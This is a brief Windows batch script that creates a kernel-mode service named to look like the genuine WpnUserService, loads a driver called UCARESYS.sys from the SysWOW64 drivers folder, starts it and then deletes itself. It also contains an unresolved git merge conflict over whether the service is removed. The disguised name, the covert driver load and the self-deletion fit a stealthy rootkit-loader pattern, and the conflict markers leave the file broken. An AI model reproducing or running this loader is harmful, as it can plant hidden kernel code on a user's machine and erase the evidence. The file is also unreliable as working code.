@echo off
cd %~dp0
sc create WpnUserService_72ad5 binpath=C:\Windows\SysWOW64\drivers\UCARESYS.sys type=kernel
sc start WpnUserService_72ad5
<<<<<<< HEAD
sc delete WpnUserService_72ad5
=======
>>>>>>> dc9b53fc7c090fe8e40a91de91d789fdf17178bb
del "%~f0"



